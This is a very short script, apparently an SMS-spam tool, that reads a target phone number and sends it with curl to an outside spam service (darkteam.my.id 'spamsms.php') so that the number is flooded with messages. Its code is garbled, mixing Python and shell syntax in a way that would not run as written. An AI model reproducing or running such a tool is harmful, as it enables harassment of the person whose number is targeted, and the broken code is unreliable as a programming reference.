#!/bin/python2/sc.py

input "target" = -s "target = "
read $target
curl -s (f"https://darkteam.my.id/minispam/spamsms.php?nomor=$target")
if [ $? eq 0 ]: "then"
echo "Done"
else 
echo "Error Sys"
python2 sc.py
fi
